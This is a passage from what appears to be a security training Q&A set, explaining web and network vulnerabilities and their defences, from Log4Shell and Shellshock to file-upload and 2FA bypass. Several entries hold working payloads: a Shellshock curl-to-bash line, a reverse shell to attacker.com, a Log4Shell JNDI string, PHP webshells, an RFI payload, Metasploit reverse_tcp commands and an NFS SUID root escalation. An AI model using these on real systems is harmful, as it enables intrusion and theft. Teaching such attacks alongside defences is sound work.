?file=/etc/passwd (no traversal needed); some frameworks block relative traversal but allow absolute paths. Defence: resolve canonical path and verify it starts with expected directory: realpath() in PHP; Path.normalize() in Java; os.path.abspath() in Python; compare resolved path against allowed base; use allowlist of permitted filenames; store files by UUID not user-supplied name.
Explain cross-site request forgery (CSRF) vulnerabilities.

CSRF (Cross-Site Request Forgery): attacker tricks victim into submitting authenticated request to another site; victim's browser automatically includes session cookies; server processes request believing it came from legitimate user. Classic attack: victim logged into bank.com; attacker's evil.com has hidden form: <form action=https://bank.com/transfer method=POST><input name=to value=attacker_account><input name=amount value=10000></form><script>document.forms[0].submit()</script>; victim visits evil.com; browser auto-submits form to bank.com with victim's session cookie; transfer executed. Requirements: victim must be authenticated to target site; request must have side effects (state-changing); site must not use CSRF protection; typically only affects state-changing requests (GET requests should have no side effects per REST conventions -- but non-standard apps use GET for state changes). SameSite cookie bypass: SameSite=Lax: cookie sent for top-level navigation (link clicks) but not subrequests; GET-based CSRF via link still possible for Lax cookies; method override (PUT/DELETE via POST with _method parameter) may bypass Lax protections; GET-based CSRF for apps that perform state-change via GET. CSRF token bypass: weak CSRF token: static per-user token (reuse across sessions); predictable token (timestamp-based); token not validated (removed from request -- does server still accept?); token validated for existence but not value (any value works); CSRF token in cookie: double-submit cookie pattern bypass if attacker can set cookie (CRLF injection, subdomain cookie injection). Referer validation bypass: some implementations check Referer header; bypass: victim is on page where Referer is not sent (meta referrer policy no-referrer); victim page uses Referrer-Policy: no-referrer header; Referer check only validates origin not full URL (https://attacker.com/bank.com/ passes domain.startsWith check). Defence: CSRF tokens (synchroniser token pattern -- random token per session or per-request stored server-side and validated on state-changing requests); SameSite=Lax/Strict cookies (modern protection; built into browser); check Origin/Referer headers; require non-standard request headers (X-Requested-With: XMLHttpRequest -- added by JS but not HTML forms; CORS blocks reading response but cannot prevent sending with custom headers from non-browser code).
What is subdomain takeover and how do you test for it?

Subdomain takeover: attacker claims abandoned cloud service that a company's DNS still points to; responses from that service appear as if they came from the company's subdomain. How it works: company sets up dev.company.com CNAME to some-project.azurewebsites.net; project decommissioned; azurewebsites.net resource deleted; DNS record not removed; anyone can register same name on azurewebsites.net; attacker registers some-project.azurewebsites.net; dev.company.com now serves attacker content. Impact: phishing (attacker serves fake login page at dev.company.com -- subdomain appears legitimate); bypass CSP (dev.company.com is in whitelist; serve malicious script from there; load on main site); cookie theft (set cookie for.company.com from subdomain; cookie sent to main site); CORS bypass (if main site trusts *.company.com origin). Detection: discover all DNS records (subfinder, amass, dnsx); for each subdomain with CNAME: check if CNAME target exists; check HTTP response for takeover signature; can-i-take-over-xyz GitHub project lists service-specific signatures (GitHub Pages: There isn't a GitHub Pages site here; Heroku: No such app; Azure: 404 Web Site not found; AWS S3: NoSuchBucket). Tools: subjack (scan for takeovers); Nuclei (templates for subdomain takeover detection); SubOver. Testing: dig subdomain.company.com CNAME (get CNAME target); curl -H Host: subdomain.company.com http://CNAME_TARGET_IP (check if service responds); or just curl https://subdomain.company.com (check response for takeover signature). Common vulnerable services: Heroku, GitHub Pages, Netlify, Vercel, AWS S3, Azure Websites, Fastly, Sendgrid, Statuspage.io, UserVoice, Zendesk, HubSpot, Pantheon, Shopify. Defence: remove DNS records when decommissioning services (automate this in offboarding checklists); regularly audit DNS records; CloudFlare DNS monitoring for CNAME changes; Subdomain monitoring with nuclei in CI/CD.
What is CVE-2021-44228 (Log4Shell) and why was it critical?

Log4Shell: critical RCE vulnerability in Apache Log4j Java logging library; CVSS 10.0; discovered December 2021. Mechanism: Log4j performs JNDI (Java Naming and Directory Interface) lookups when logging strings; attacker-controlled input like ${jndi:ldap://attacker.com/a} logged by application triggers LDAP lookup; attacker-controlled LDAP server returns reference to malicious Java class; application downloads and executes class = RCE. Why critical: Log4j embedded in virtually every Java application (Spring Boot, Elasticsearch, Apache Solr, VMware vCenter, Minecraft servers, countless others); exploit requires only that application logs user input (User-Agent header, login username, search queries) -- minimal requirements; no authentication needed; instant widespread exploitation within 24 hours of disclosure. Impact: data exfiltration, ransomware deployment, cryptomining, botnet recruitment; NSA, CISA, FBI issued emergency guidance; enterprise scramble to patch. Bypass variants: ${${::-j}${::-n}${::-d}${::-i}:...} -- nested substitution to bypass WAF rules; ${jndi:dns://...} for OOB detection; ${jndi:rmi://}, ${jndi:ldaps://}. Fix: Log4j 2.17.1 (JDK >= 8); set log4j2.formatMsgNoLookups=true (partial mitigation); WAF rules to block ${jndi: patterns; network egress controls to block JNDI callback.
What is EternalBlue and how was it used in WannaCry?

EternalBlue (CVE-2017-0144): SMBv1 (Server Message Block version 1) remote code execution vulnerability; originally developed by NSA; leaked by Shadow Brokers in April 2017. Vulnerability: buffer overflow in SMBv1 handling of Transaction2 requests; triggers pool corruption; leads to arbitrary kernel-mode code execution; no authentication required; operates on port 445; wormable (spreads automatically to other vulnerable hosts). WannaCry (May 2017): North Korean APT (Lazarus) used EternalBlue for propagation; infected 200,000+ systems in 150 countries in 48 hours; NHS UK crippled (cancelled operations, diverted ambulances); $4B+ estimated damage; ransomware component encrypted files and demanded Bitcoin. NotPetya (June 2017): followed WannaCry; used EternalBlue + Mimikatz for lateral movement; pseudo-ransomware (no real decryption mechanism); destructive wiper targeting Ukraine; spread globally (Maersk, Merck, FedEx); $10B+ in damages -- most expensive cyberattack in history. Defence: disable SMBv1 (Windows: Set-SmbServerConfiguration -EnableSMBv1 $false); apply MS17-010 patch (released March 2017 -- two months before WannaCry; patched Windows 7/Server 2008; Microsoft released emergency patch for XP/2003 after WannaCry); block port 445 at perimeter and between network segments; network segmentation prevents lateral spread.
What is Heartbleed and how does it work?

Heartbleed (CVE-2014-0160): critical buffer over-read in OpenSSL's TLS heartbeat extension; allowed reading up to 64KB of server memory per request; no authentication required. Heartbeat extension: TLS keep-alive mechanism; client sends heartbeat message with payload (up to 64KB) and length; server echoes payload back; OpenSSL bug: server read length from attacker-controlled field without validating actual payload length; if payload is 1 byte but claimed length is 65535 bytes: server reads 65534 bytes of adjacent memory into response. Memory content: private keys (SSL private key -- game over; attacker can decrypt all past and future traffic with Perfect Forward Secrecy caveat); session tokens (hijack authenticated sessions); passwords typed by users on HTTPS pages; other sensitive memory contents. Scale: affected ~17% of internet HTTPS servers (all using OpenSSL 1.0.1 through 1.0.1f); patch available April 7 2014; mass exploitation before patching. Detection: Heartbleed scanner (systemic scanning tools); Metasploit module; simple Python PoC available within hours of disclosure. Exploitation: send malformed heartbeat; capture response; look for private key markers (BEGIN RSA PRIVATE KEY), session cookies, passwords. Key impact: even if patched, attackers who captured traffic during vulnerable period could decrypt if they stole private key and traffic used RSA key exchange (not PFS). Defence: update OpenSSL to 1.0.1g+; regenerate private keys and certificates (old key potentially compromised); revoke old certificates via CRL/OCSP; invalidate existing sessions (force re-login); enabled HSTS to prevent downgrade.
How does Shellshock work?

Shellshock (CVE-2014-6271, -6277, -6278): critical vulnerability in GNU Bash shell; allowed executing arbitrary commands via specially crafted environment variables; affected servers using Bash to process requests. Mechanism: Bash exports functions in environment variables using format VARNAME=() { commands; }; bug: Bash executed code AFTER the function definition when importing; payload: ENV_VAR=() { ignored; }; /bin/malicious_command; any Bash invocation with attacker-controlled environment variables executes the appended command. Attack vectors: CGI scripts (Common Gateway Interface): web server sets HTTP headers as environment variables then invokes shell script; attacker sends malicious User-Agent or Referer: User-Agent: () { :; }; /usr/bin/curl http://attacker.com/shell.sh | bash; DHCP: DHCP server sends attacker-controlled hostname as environment variable; client runs Bash dhcp-script and executes payload; SSH: if ForceCommand used with attacker-controlled environment (SSH_ORIGINAL_COMMAND variable); SIP, SMTP, OpenVPN. Web exploitation: curl -H 'User-Agent: () { ignored; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' http://target.com/cgi-bin/script.cgi -- if CGI script runs bash: reverse shell. Shodan found 500,000+ vulnerable servers in 2014; immediate and widespread exploitation. Defence: update Bash (patches released same day as disclosure); disable CGI scripts not needed; use wsgi/FastCGI instead of CGI (does not use environment variables in same way); Web Application Firewall rules to block Shellshock payloads.
What is PrintNightmare (CVE-2021-1675 / CVE-2021-34527)?

PrintNightmare: critical Windows Print Spooler vulnerability allowing local privilege escalation (LPE) and remote code execution (RCE) on all Windows versions; CVSS 8.8. Two related CVEs: CVE-2021-1675 (LPE) and CVE-2021-34527 (RCE -- more severe). Mechanism: Windows Print Spooler service (spoolsv.exe) runs as SYSTEM; AddPrinterDriverEx() RPC function allows non-admin users to install printer drivers; attacker specifies attacker-controlled DLL as printer driver; DLL loaded by Spooler service = SYSTEM code execution. RCE path: any authenticated domain user can call AddPrinterDriverEx() remotely; specify UNC path to malicious DLL on attacker SMB share; domain user becomes SYSTEM on remote target. Impact: immediate domain compromise if domain controller Spooler service accessible (domain users can trigger on DC = instant domain admin); widely and rapidly exploited by ransomware groups. PoC published on GitHub before Microsoft patch released (accidental disclosure). Exploitation: python3 CVE-2021-1675.py domain/user:pass@DC_IP '\\attacker_ip\share\malicious.dll'; rpcclient method also works. Defence: disable Print Spooler service on all domain controllers and servers that do not need printing (critical -- DCs never need Spooler); block inbound RPC/SMB from internet; July 2021 patch (KB5004945 and later cumulative updates); restrict access to SpoolersubmitFile; PointAndPrint GPO restriction to only trusted print servers.
What is ProxyLogon and ProxyShell in Microsoft Exchange?

ProxyLogon (CVE-2021-26855): server-side request forgery (SSRF) in Microsoft Exchange; combined with CVE-2021-27065 (post-auth file write) for pre-auth RCE. ProxyLogon SSRF: Exchange exposes /ecp endpoint without authentication; attacker sends X-BEResource cookie with backend target; Exchange forwards request to backend server as SYSTEM-level Exchange server; effectively bypass Exchange authentication. Chain with CVE-2021-27065: use SSRF to write arbitrary file to any path on Exchange server; write ASPX webshell to wwwroot; RCE. Exploitation: 250,000+ Exchange servers exposed; exploited by HAFNIUM (Chinese state actor) as zero-day; mass exploitation began within hours of public disclosure. ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207): three CVE chain; authentication bypass (CVE-2021-34473): URL confusion in IIS allows endpoint access without authentication; privilege escalation (CVE-2021-34523): Exchange PowerShell backend elevates to SYSTEM; RCE (CVE-2021-31207): SYSTEM can write webshell. Exploitation: unauthenticated access to EWS (Exchange Web Services); enumerate mailboxes; write arbitrary files to disk; webshell deployed. Widely exploited by LockFile, Conti, and other ransomware groups in 2021. Metasploit modules available for both. Defence: apply cumulative updates (March 2021 for ProxyLogon; July 2021 for ProxyShell); block external access to /ecp and /owa if not needed; network-level filtering; Exchange on-premises patching critical; Exchange Online (Office 365) not affected (Microsoft manages patching).
What is Spring4Shell (CVE-2022-22965)?

Spring4Shell: critical RCE vulnerability in Spring Framework (Java); CVSS 9.8; exploited in JDK 9+ with Spring MVC or Spring WebFlux apps deployed as WAR to Tomcat. Mechanism: Spring Framework data binding (binding HTTP request parameters to Java objects via Spring's DataBinder); attacker manipulates class.module.classLoader and Tomcat-specific properties to write arbitrary content to Tomcat's logging system; effectively writes JSP webshell to webroot. Requirements: JDK 9 or later (uses module system introduced in Java 9); Spring Framework 5.3.0-5.3.17 or 5.2.0-5.2.19; deployed as WAR file on Apache Tomcat; Spring's data binding must process input from untrusted sources. Exploit: GET /any-spring-endpoint?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B... (complex parameter chain to write log file as JSP webshell). Impact: less widespread than Log4Shell (more specific conditions required); Spring is extremely popular Java framework; Pivotal/VMware released patches same day as disclosure. Detection: WAF rules blocking class.module.classLoader patterns; Spring Framework security advisories; look for suspicious GET parameters with class., classLoader. substrings. Fix: Spring Framework 5.3.18+; Spring Framework 5.2.20+; Spring Boot 2.6.6, 2.5.12; or apply workaround: configure DataBinder to disallow class.* fields.
How do you exploit MS08-067 (NetAPI)?

MS08-067 (CVE-2008-4250): Windows Server Service RPC remote code execution; unauthenticated; wormable; exploited by Conficker worm (2008); still present in unpatched Windows XP/2003/Vista/2008 in legacy environments and labs. Vulnerability: buffer overflow in NetAPI32.dll's NetpwPathCanonicalize function; called via DCERPC over SMB port 445; no authentication required; reliable exploitation to SYSTEM shell on Windows XP SP0-SP3 and Server 2003 SP1/SP2 (unreliable on later versions). Metasploit: use exploit/windows/smb/ms08_067_netapi; set RHOSTS TARGET_IP; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit; instant SYSTEM shell. Detection check: nmap --script smb-vuln-ms08-067 TARGET_IP (safe check script); auxiliary/scanner/smb/smb_ms08_067 in Metasploit. Historical significance: Conficker worm used this vulnerability; infected 9-15 million computers; largest botnet at time; still found in healthcare, manufacturing (legacy systems never patched). OT/ICS environments: Windows XP/Server 2003 still running process control software; cannot be patched easily; network isolation critical. Defence: patch (MS08-067 update October 2008); disable Windows Server service if not needed; firewall port 445; network segmentation to isolate unpatched legacy systems.
What is the DROWN attack against SSL?

DROWN (Decrypting RSA with Obsolete and Weakened eNcryption, CVE-2016-0800): cross-protocol attack using SSLv2 to break TLS; allows decrypting TLS 1.x traffic that used RSA key exchange. How it works: attacker captures modern TLS 1.x RSA key exchange packets from victim; SSLv2 supports export-grade RSA (512-bit keys, weak cipher); if target server (or any server sharing the same RSA private key) supports SSLv2: attacker sends crafted SSLv2 messages to SSLv2-enabled server; uses server as oracle to crack modern TLS pre-master secret; 2^50 operations (feasible with cloud computing); decrypt captured TLS session. Requirements: victim TLS connections use RSA key exchange (not DHE/ECDHE -- PFS prevents DROWN); server shares RSA key with any SSLv2-enabled server; many organisations shared certificates between web and email servers -- email servers often had SSLv2 enabled. Scale: 33% of HTTPS servers vulnerable in 2016; 11.5 million servers. Defence: disable SSLv2 on ALL servers using same certificate; use separate certificates for separate services; prefer ECDHE cipher suites (PFS -- eliminates RSA key exchange vulnerability); generate new certificates if SSLv2 was ever enabled with current certificate.
Explain the Spectre and Meltdown CPU vulnerabilities.

Meltdown (CVE-2017-5754): transient execution attack; exploits CPU out-of-order execution; unprivileged process reads arbitrary kernel memory. How: modern CPUs speculatively execute instructions before checking if allowed; CPU reads kernel memory speculatively (access check fails, instruction reverted) but data remains in CPU cache; attacker uses cache side-channel (Flush+Reload timing attack) to recover speculatively accessed data; affects Intel and some ARM processors; AMD not affected. KPTI (Kernel Page Table Isolation): Linux mitigation; separate page tables for user and kernel space; significant performance impact (5-30% for system-call-heavy workloads); Windows Meltdown patch similar. Spectre (CVE-2017-5753, CVE-2017-5715): harder to exploit, harder to mitigate; tricks other processes (including kernel) into speculatively executing arbitrary code; attacker reads other process memory via cache side-channel; Spectre variant 1 (bounds check bypass): JavaScript JIT engine speculates past bounds check; attacker array access in browser JavaScript leaks browser process memory; Spectre variant 2 (branch target injection): attacker poisons branch predictor to cause indirect jump to attacker-chosen gadget in victim code; affects Intel, AMD, ARM; multiple variants still being discovered (SpectreRSB, ret2spec, etc.). Browser mitigations: disable SharedArrayBuffer (high-resolution timer for timing attacks); add jitter to performance.now(); site isolation (each site in separate process). Hardware mitigations: Retpoline (return trampoline) for variant 2 in software; microcode updates (IBRS, IBPB, STIBP) for hardware-level mitigations; performance impact variable. Real-world exploitation: cross-privilege (process to kernel) Meltdown readily exploited; cross-process Spectre demonstrated but complex; cloud VMs on shared hardware theoretically vulnerable to cross-VM attacks; Spectre still open research problem.
What is the Zerologon vulnerability (CVE-2020-1472)?

Zerologon: critical flaw in Netlogon Remote Protocol (MS-NRPC); allows unauthenticated attacker with network access to domain controller to set DC computer account password to empty -- effectively instant domain admin. CVSS 10.0. Root cause: Netlogon authentication uses AES-CFB8 (Cipher Feedback 8-bit); implementation uses 16 zero bytes as IV (Initialization Vector) instead of random IV; due to AES-CFB8 properties: sending 256 crafted authentication attempts: statistical probability that 1 in 256 attempts encrypts all zeros to all zeros (because of predictable IV); attacker can make Netlogon authentication succeed without knowing credentials. Exploitation: attacker on network sends 256 crafted Netlogon authentication requests; one succeeds (on average); attacker changes DC machine account password to empty; impersonates DC to other DCs (DCSync equivalent); dumps all password hashes; complete domain compromise in seconds. Tooling: secretsdump.py or dedicated Zerologon PoC; very fast exploitation (5-10 seconds to domain admin). Remediation consideration: changing DC machine account password to empty breaks domain function; Impacket has restorepassword option; careful remediation required. Defence: patch (August 2020 MS20-1472); Microsoft released two-phase response: initial patch (log attacks but allow vulnerable clients for compatibility); February 2021 enforcement mode (block vulnerable clients -- default enforced); emergency patch; also verify no domain controllers still unpatched in estate. Detection: Event 5829 (vulnerable Netlogon connection allowed); Event 5827/5828 (blocked connections) in enforcement mode; spike in Netlogon authentication attempts from non-DC source = Zerologon attempt.
What is the BlueKeep vulnerability (CVE-2019-0708)?

BlueKeep: pre-authentication wormable RCE in Windows Remote Desktop Services (RDS); affects Windows XP, 7, Server 2003, 2008 (not Windows 8, 10, Server 2012+); CVSS 9.8; patched May 2019. Vulnerability: use-after-free in RDP kernel driver (termdd.sys); binding channel specific to RDP negotiation; attacker sends crafted RDP packets; causes UAF condition; arbitrary kernel code execution without authentication; wormable -- spreads from machine to machine automatically. NSA and GCHQ issued urgent warnings comparing to EternalBlue/WannaCry; 950,000+ internet-exposed systems at disclosure; mass exploitation expected but complex exploit reliability (kernel ASLR, heap allocation variability) delayed weaponisation. Metasploit module added October 2019; proof-of-concept caused BSoD more often than shell due to KASLR; full working exploit requires KASLR bypass via information leak or brute force. Related CVEs: DejaBlue (CVE-2019-1181, CVE-2019-1182): same class of vulnerability in RDS affecting Windows 8, 10, Server 2012+ (later versions); also pre-auth; patched August 2019. Defence: apply security patches; disable RDP if not required; do not expose RDP directly to internet (RDP Gateway); Network Level Authentication (NLA) prevents unauthenticated access to vulnerable component (NLA requires authentication before full RDP session established -- mitigates but does not patch); block port 3389 at perimeter; firewall to management networks only.
How do you exploit misconfigured NFS shares?

NFS (Network File System) attack: enumerate and exploit misconfigured NFS exports. Enumeration: showmount -e TARGET_IP (list NFS exports; shows path and who can access: /home *, /backup 10.0.0.0/8); nmap -p 111 --script rpcinfo TARGET_IP (enumerate RPC services including NFS); nmap -p 2049 TARGET_IP (NFS port). Mount: mount -t nfs TARGET_IP:/exported/path /mnt/nfs (mount export; no authentication in NFSv3; NFSv4 adds AUTH_SYS or Kerberos). Common misconfigs: (1) Exported with * (anyone can mount): showmount shows /backup *; mount and read all backup files; find credentials, SSH keys, database dumps. (2) no_root_squash: by default NFS squashes root requests to nobody (UID 65534); if no_root_squash set: attacker's root is root on NFS share; create SUID binary: cp /bin/bash /mnt/nfs/bash; chmod 4755 /mnt/nfs/bash; on server: /mnt/nfs/bash -p (if server mounts same share); SUID binary runs as root. (3) insecure: NFS uses privileged port (1-1023) by default; if insecure allows high ports too: clients don't need privileged access to mount. (4) NFSv2/NFSv3 without Kerberos: no authentication; access based on IP/hostname in exports file; spoof IP to bypass restriction. UID manipulation: NFS trusts UID from client; create local user with UID matching remote user (UID 1000 = bob): useradd -u 1000 fake_bob; sudo -u fake_bob ls /mnt/nfs -- accesses files owned by UID 1000 on server as if bob. Defence: restrict exports to specific IPs/subnets (never *); use root_squash (default); use NFSv4 with Kerberos authentication; firewall ports 111 and 2049 to authorised clients; audit export configs: cat /etc/exports.
What is DNS rebinding and how does it work?

DNS rebinding: attacker-controlled domain initially resolves to legitimate external IP (passes browser SOP check) then rebinds to internal IP target; browser then allows JavaScript to make requests to what it thinks is same origin. Step by step: (1) Victim's browser loads attacker page at evil.com; DNS resolves evil.com to attacker IP (43.x.x.x); page loads attacker JavaScript. (2) Attacker sets evil.com DNS TTL=1 second; quickly switches DNS to resolve evil.com to internal target IP (192.168.1.1). (3) JavaScript on attacker page makes fetch(http://evil.com/); browser thinks same origin (evil.com:80 = evil.com:80 = SOP satisfied); DNS re-resolves evil.com to 192.168.1.1; request goes to internal router admin panel. (4) JavaScript reads response; exfiltrates router admin page content or makes state-changing requests (change DNS settings, add admin user). Impact: bypass same-origin policy for internal service access; access admin interfaces not exposed to internet; access cloud metadata (169.254.169.254); extract credentials from internal applications; port scan internal network from victim browser. Requirements: victim must keep page open long enough for TTL expiry; browser may cache DNS response (some browsers ignore TTL lower bound); need to know or guess internal IP of target. Tools: Singularity of Origin (automated DNS rebinding tool); BurpSuite-based rebinding for testing; HostnameInjector extension. Mitigations: DNS-based: rebinding protection at DNS resolver level (block resolution of public domains to private IPs); private DNS resolvers reject RFC1918 responses for external domains; Kubernetes CoreDNS has rebinding protection. Application: use Host header validation (reject requests where Host is not in expected whitelist); internal services should not trust Host header from internet. Browser: Chrome since 2022 blocks private IP access without explicit permission (CORS Private Network Access); Firefox plans similar.
How do you bypass two-factor authentication?

2FA bypass techniques: (1) Phishing with real-time relay: attacker creates fake login page; victim enters credentials AND 2FA code; attacker relays to real site in real-time (Evilginx, Modlishka, Muraena reverse proxies); session cookie captured after successful auth; victim's full authenticated session stolen; TOTP codes valid for 30 seconds -- sufficient for real-time relay. (2) SIM swapping: social engineer mobile carrier to transfer victim phone number to attacker SIM; intercept SMS 2FA codes; effective against SMS-based 2FA; defence: use authenticator app or hardware key instead of SMS. (3) SS7 attack: exploit Signalling System 7 telecom protocol vulnerabilities; intercept SMS messages at carrier level without SIM swap; requires carrier-level access or exploit (nation-state or well-resourced criminal). (4) Account recovery bypass: many sites have 2FA but weak account recovery (security questions, email-only recovery); bypass 2FA by triggering recovery flow that doesn't require 2FA; test recovery options for 2FA bypass. (5) Brute force TOTP: TOTP codes are 6 digits = 1 million combinations; if no rate limiting on 2FA code entry; attack window = 30-second code validity; with fast brute force: try all 1 million codes per 30s window (challenging but theoretically possible without lockout). (6) Leaked codes: TOTP secret leaked (app backup, QR code photo, database breach with TOTP secret); attacker generates valid codes from stolen secret indefinitely. (7) OAuth/SSO bypass: if site allows login via third-party (Google, Facebook) without 2FA enforced on SSO path; enable SSO login bypass to avoid 2FA. (8) Older API version: mobile app v1 API endpoint may not enforce 2FA while web frontend does; test all API versions. (9) Response manipulation: some implementations only check 2FA result client-side; intercept response and change {mfaRequired:true} to {mfaRequired:false} in Burp. Defence: FIDO2/WebAuthn hardware keys (phishing-resistant; relay attacks fail because authentication bound to domain); enforce 2FA on ALL authentication paths including API and recovery; no SMS 2FA for high-value accounts.
What is SAML and what are common SAML vulnerabilities?

SAML (Security Assertion Markup Language): XML-based standard for SSO (Single Sign-On) authentication; identity provider (IdP) authenticates user and issues signed XML assertion; service provider (SP) validates assertion and grants access. Flow: user accesses SP; SP redirects to IdP; user authenticates at IdP; IdP issues signed SAML assertion (XML containing NameID = username, attributes, validity period); returned to SP via POST (browser redirect); SP validates signature and grants access. Common vulnerabilities: (1) XML signature wrapping (XSW): SAML response is signed XML; attacker manipulates XML structure without invalidating signature; add malicious unsigned assertion alongside legitimate signed assertion; SP processes unsigned malicious assertion thinking signature covers it; effectively change NameID to another user = account takeover. Multiple XSW variants. (2) Signature validation missing: SP does not validate signature at all; any crafted assertion accepted; change NameID to admin; complete authentication bypass. (3) Signature algorithm confusion: SP accepts MD5 or SHA1 signatures; collision attack to forge assertion; recommendation: require SHA256+. (4) XXE in SAML: SAML is XML; if SP's XML parser processes external entities; assertion may trigger XXE when parsed. (5) XML canonicalisation issues: XML canonicalisation normalises XML before signing; edge cases in normalisation allow manipulation. (6) Comment injection: inject XML comment inside NameID: admin<!-->attacker</NameID>; some parsers strip comments, signature validates, SP reads NameID as admin while original has comment. (7) Replay attack: SAML assertion has validity window (NotBefore, NotOnOrAfter); if SP does not track used assertion IDs: replay valid assertion. Testing: SAML Raider (Burp extension); intercept SAML response in Burp; decode base64; analyse XML; modify NameID; re-sign with attacker key; check if SP validates signature correctly. SAML Hacking Tools: samltool.com (online SAML decoder/encoder); SAMLExtractor; SAML Raider Burp extension.
How do you bypass file type restrictions in web applications?

File type restriction bypass: applications restrict uploaded file types to prevent malicious uploads. Detection mechanisms and bypasses: (1) Client-side validation: JavaScript checks extension before upload; bypass by disabling JS in browser or intercept request with Burp after client-side check passes; change filename in intercepted request. (2) Extension check: server checks extension only; rename webshell.php to webshell.php.jpg; some servers execute based on extension; or blacklist missing.php5,.phtml,.phar,.php7; try all variants. (3) Content-Type check: server checks Content-Type header; change Content-Type: application/x-php to Content-Type: image/jpeg in Burp; server may accept without checking actual content. (4) Magic bytes check: server reads first bytes of file for file signature; prepend GIF header (GIF89a;) before PHP code: GIF89a;<?php system($_GET[cmd]); ?>; looks like GIF to magic byte check but PHP parser executes code. (5) Image processing: if server processes image (resize, thumbnail): use polyglot -- valid image file that also contains PHP code; JPEG/PNG files can have PHP code embedded in EXIF data or in file body without corrupting image structure; ExifTool to inject: exiftool -Comment='<?php system($_GET[cmd]); ?>' image.jpg. (6) MIME sniffing: Internet Explorer MIME sniffing executes HTML in image if uploaded to same domain and loaded without X-Content-Type-Options header; less relevant in modern browsers. (7) Double extension: file.php.jpg -- if web server configured to parse PHP regardless of secondary extension: AddHandler application/x-httpd-php.php in Apache per-directory; or.htaccess upload: AddType application/x-httpd-php.jpg. (8) IIS parsing: old IIS: /uploads/test.jpg/anything.asp -- IIS executes as ASP if URL ends in.asp; semicolon: test.asp;.jpg on old IIS. (9) Null byte injection: file.php%00.jpg -- if server uses C function for extension check: null terminates string; sees.php as extension; (fixed in PHP 5.3.4+ but found in legacy systems).
What is RFI (Remote File Inclusion) and how is it exploited?

Remote File Inclusion: web application includes files from remote URLs based on user input; attacker hosts malicious file; server fetches and executes it. Requirements: allow_url_include = On in PHP configuration (disabled by default since PHP 5.2; enabled only if explicitly configured); allow_url_fopen = On (default On); parameter passed to include/require function without sanitisation. Basic exploitation: vulnerable code: include($_GET[page]); attacker sends: ?page=http://attacker.com/shell.php; PHP fetches http://attacker.com/shell.php; executes code on server. Attacker-hosted file (shell.php): <?php system($_GET[cmd]); ?>. With RFI: instant RCE; no need for path traversal complexity. Data URI wrapper (if allow_url_include On): ?page=data:text/plain,<?php system($_GET[cmd]); ?> (inline PHP code without external HTTP request); useful when outbound HTTP filtered. PHP FTP wrapper: ?page=ftp://attacker.com/shell.php (if FTP available). Testing: inject http://attacker.com/test.txt (unique URL to Burp Collaborator); check Collaborator for HTTP request from server; confirms RFI without needing allow_url_include; if DNS-only request: server resolves domain but may not fetch over HTTP (DNS RFI detection useful for mapping). Difference from SSRF: SSRF: server makes HTTP request; response returned to attacker or used internally. RFI: server fetches file AND executes its contents (code execution). Defense: disable allow_url_include (critical); input validation (whitelist allowed filenames or paths); do not pass user input to include/require; use parameterised file loading (switch/case for known files); open_basedir restriction prevents including files outside web root.
How do you find vulnerabilities in authentication mechanisms?

Authentication vulnerability testing checklist: (1) Username enumeration: register/forgot password with existing vs non-existing username; different error message or response time reveals valid usernames; timing attack on bcrypt (valid username hashes password, invalid skips -- different timing). (2) Default credentials: try admin/admin, admin/password, admin/1234, test/test, user/user; check application documentation for default credentials. (3) Brute force: attempt login repeatedly; check for: account lockout (after 5 failures?); rate limiting (429 Too Many Requests?); CAPTCHA (bypassable?); lockout scope (lockout by username, IP, or session -- IP lockout bypassed with X-Forwarded-For; session lockout reset by new session). (4) Weak password policy: test passwords: abc123, password, 12345678; note minimum complexity requirements; try passwords from previous breaches (HaveIBeenPwned integration?). (5) Credential stuffing protection: automated defence (bot detection, CAPTCHA, rate limiting); test with tools (Hydra). (6) Forgot password flow: is reset token random and unique? Long enough (min 32 chars)? Short TTL (expire after 1 hour)? Single use? Token in URL (Referer leakage) or POST body? Can attacker request reset for any account and reset to known email? (7) Session management: is session token cryptographically random? Long enough? Rotated after login (session fixation prevention)? Invalidated on logout? Proper cookie attributes (Secure, HttpOnly, SameSite)? Concurrent session handling. (8) Remember me / persistent login: is persistent token stored securely? Long-lived token entropically strong? Invalidated on logout? (9) Social login: OAuth implementation vulnerabilities (see OAuth section). (10) Multi-tenancy: can user from tenant A access tenant B? Tenant ID in session or JWT -- tamper? Tools: Burp Intruder for brute force; FFUF; Hydra; Wordlists: SecLists (common-credentials).
What are common misconfigurations in web servers (Apache, Nginx)?

Web server misconfiguration vulnerabilities: Apache: (1) Directory listing: Options Indexes enabled; http://target.com/files/ lists all files; find source code, backups, configuration files; disable with Options -Indexes in httpd.conf. (2).htaccess traversal: expose.htaccess files: curl http://target.com/.htaccess -- may reveal URL rewriting rules, authentication configs, PHP settings. (3) ModStatus: http://target.com/server-status exposed publicly; shows active requests, process info, worker status; disable or restrict by IP: <Location /server-status> Require local </Location>. (4) PHP settings: display_errors = On (verbose error messages reveal paths, database info); expose_php = On (X-Powered-By header reveals PHP version). (5) Improper SSI (Server Side Includes): SSI enabled on writable directory; upload.shtml file with <!--#exec cmd=id --> for RCE. (6) AddHandler misconfiguration: AddHandler application/x-httpd-php.php.jpg -- executes uploaded JPEG as PHP. Nginx: (1) Off-by-slash path traversal: location /files { alias /home/user/files; } (no trailing slash on alias); request to /files../etc/passwd reads /home/user/files../etc/passwd = /home/user/etc/passwd (one level up -- traversal). (2) Try_files misuse: try_files $uri $uri/ =404 -- if URI can include null bytes or path traversal components and try_files resolves them: potential traversal. (3) Expose hidden files: location ~* /\. { deny all; } missing; http://target.com/.git/config exposed (common on development servers deployed to production with Git). Both servers: (4) Verbose error pages: stack traces, file paths, database connection strings in error pages; disable custom error pages. (5) Backup files: http://target.com/index.php.bak or /index.php~ (vim backup) or /index.php.orig accessible; contains source code. (6) HTTP methods: TRACE method enabled: HTTP response includes request headers; used in cross-site tracing (XST) for cookie theft (historical, modern browsers block). Testing: Nikto (automated web server misconfiguration scanner); DirBuster/Gobuster for file enumeration; Shodan for internet-exposed server-status pages.
What is the difference between authorization and authentication?

